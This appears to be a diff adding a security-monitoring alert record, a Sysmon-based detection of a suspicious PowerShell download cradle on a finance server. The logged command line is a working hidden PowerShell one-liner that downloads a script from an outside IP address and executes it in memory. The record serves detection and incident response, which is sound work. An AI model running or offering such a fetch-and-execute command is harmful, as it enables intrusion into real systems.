@@ -1,0 +1,8 @@
+{
+  "id": "1730709002.8812",
+  "timestamp": "2026-11-11T01:45:00.000+0530",
+  "rule": {"level": 12, "description": "Sysmon - Suspicious PowerShell Web Download Cradle", "id": "92052", "mitre": {"id": ["T1059.001"], "tactic": ["Execution"]}},
+  "agent": {"id": "004", "name": "FINANCE-SRV-01", "ip": "10.10.20.15"},
+  "data": {"srcip": "185.220.101.35", "win": {"eventdata": {"user": "CORP\\jdoe", "commandLine": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\"http://185.220.101.35/payload.ps1\")", "hashes": "SHA256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"}}},
+  "full_log": "Sysmon Event ID 1: powershell.exe initiated outbound connection to 185.220.101.35"
+}
